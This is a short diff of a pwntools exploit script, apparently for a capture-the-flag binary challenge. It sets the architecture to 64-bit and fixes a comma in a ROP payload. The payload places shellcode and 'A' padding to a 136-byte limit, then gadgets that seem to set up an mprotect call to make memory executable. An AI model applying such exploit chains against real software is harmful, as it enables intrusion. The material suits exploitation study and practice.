@@ -8,6 +8,8 @@ env = {"PATH":"$PATH:."}
 elf = ELF(file)
 
 max_len = 136
+context.arch = "x86-64"
+context.bits = 64
 
 # launch the main process (still boilerplate)
 if DEBUG:
@@ -59,7 +61,7 @@ payload = flat (
     shellcode,
     (max_len - len(shellcode)) * b"A",
     pop_rdi,
-    global_area
+    global_area,
     pop_rdx_rsi,
     p64(7),
     p64(0x1000),
